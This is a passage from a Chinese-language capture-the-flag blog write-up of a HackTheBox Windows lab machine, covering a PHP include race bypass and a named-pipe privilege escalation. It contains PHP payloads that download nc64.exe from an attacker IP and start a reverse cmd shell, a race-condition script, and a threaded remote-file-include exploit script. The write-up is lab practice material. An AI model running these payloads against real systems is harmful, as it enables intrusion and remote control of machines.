<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web:charlotte123!</span><br></pre></td></tr></table></figure>
<p>重启smb服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo .</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br></pre></td></tr></table></figure>
<p>通过竞争修改本地文件内容来进行Bypass</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">payload=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">while</span>((1))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$payload</span>&quot;</span> &gt; header.inc</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>GetShell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c start \windows\system32\spool\drivers\color\yolo.exe -e cmd 10.10.16.7 9990&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thd</span>():</span></span><br><span class="line">	_ = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> _ &lt; <span class="number">100</span>:</span><br><span class="line">		req = requests.session()</span><br><span class="line">		login_url = <span class="string">&quot;http://10.10.10.231/licenses/index.php&quot;</span></span><br><span class="line">		username = <span class="string">&quot;vikki.solomon@throwaway.mail&quot;</span></span><br><span class="line">		password = <span class="string">&quot;password1&quot;</span></span><br><span class="line">		data = &#123;<span class="string">&quot;username&quot;</span>:username, <span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">		res = req.post(url=login_url, data=data)</span><br><span class="line">		index_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php&quot;</span></span><br><span class="line">		res = req.get(url=index_url)</span><br><span class="line">		payload_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot;</span></span><br><span class="line">		res = req.get(url=payload_url)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;hacked&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			print(res.text)</span><br><span class="line">		logout_url = <span class="string">&quot;http://10.10.10.231/licenses/logout.php&quot;</span></span><br><span class="line">		res = req.get(url=logout_url)</span><br><span class="line">		_ += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">poll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">	single_thd = threading.Thread(target=thd)</span><br><span class="line">	poll.append(single_thd)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> poll:</span><br><span class="line">	n.start()</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure>
<p>不行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe</span><br></pre></td></tr></table></figure>
<p>行<br />
不知道触发了什么奇怪的bug, 改个文件名就能写入了<br />
<s>家目录下就能写, 害隔着World-Writable呢</s></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\web\desktop\user.txt</span><br><span class="line">540dbda93520798e554345539fe38988</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \&quot;Program Files<span class="string">&quot;\cleanup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">11/15/2020  05:03 AM         2,999,808 client.exe</span></span><br><span class="line"><span class="string">11/15/2020  10:22 AM               174 README.md</span></span><br><span class="line"><span class="string">11/15/2020  06:20 AM         3,041,792 server.exe</span></span><br></pre></td></tr></table></figure>
<p>FTP莫名其妙用不了</p>
<p>传文件只能曲线救国了</p>
<p>Apache2允许PUT但是不能直接上传文件</p>
<p>不过文件会进行流量传输</p>
<p>所以就监听流量然后还原文件</p>
<p>逆向没逆明白, 只能看Raid上的WP了</p>
<p>先做一个链接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /j \users\web\downloads\yoloyolo \users\administrator\desktop</span><br></pre></td></tr></table></figure>
<p>操控管道<code>\\.\pipe\cleanuppipe</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo CLEAN \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br></pre></td></tr></table></figure>
<p>此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至<code>\programdata\cleanup</code>(这个程序应该是administrator运行的)</p>
<p>删掉链接, 创建文件夹, 再还原文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rmdir \users\web\downloads\yoloyolo</span><br><span class="line">mkdir \users\web\downloads\yoloyolo</span><br><span class="line"><span class="built_in">echo</span> RESTORE \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br><span class="line"><span class="built_in">type</span> \users\web\downloads\yoloyolo\root.txt</span><br><span class="line"></span><br><span class="line">f2167014736b2934e9721962b525f674</span><br></pre></td></tr></table></figure>
<p><s>这台机子的姿势太骚了</s></p>
<p>What a machine.</p>
<hr />
<p>EOF</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>xXxYOLOxXx
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/" title="HackTheBox_Windows_Set_0">https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
              <a href="/tags/Windows/" rel="tag"># Windows</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/06/04/HackTheBox-Start-Point/" rel="prev" title="HackTheBox_Start_Point">
      <i class="fa fa-chevron-left"></i> HackTheBox_Start_Point
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/07/04/CISCN-SE-Semifinal/" rel="next" title="CISCN-SE_Semifinal">
      CISCN-SE_Semifinal <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_love"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_love</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_atom"><span class="nav-number">2.</span> <span class="nav-text"> HackTheBox_Atom</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="nav-number">2.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">2.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2"><span class="nav-number">2.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_breadcrumbs"><span class="nav-number">3.</span> <span class="nav-text"> HackTheBox_Breadcrumbs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-3"><span class="nav-number">3.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text"> 路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">3.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3"><span class="nav-number">3.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_proper"><span class="nav-number">4.</span> <span class="nav-text"> HackTheBox_Proper</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-4"><span class="nav-number">4.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%89%AB%E6%8F%8F-2"><span class="nav-number">4.2.</span> <span class="nav-text"> 路径扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">4.3.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-4"><span class="nav-number">4.4.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
  <div class="site-description" itemprop="description">Explorer for unknown.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">61</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
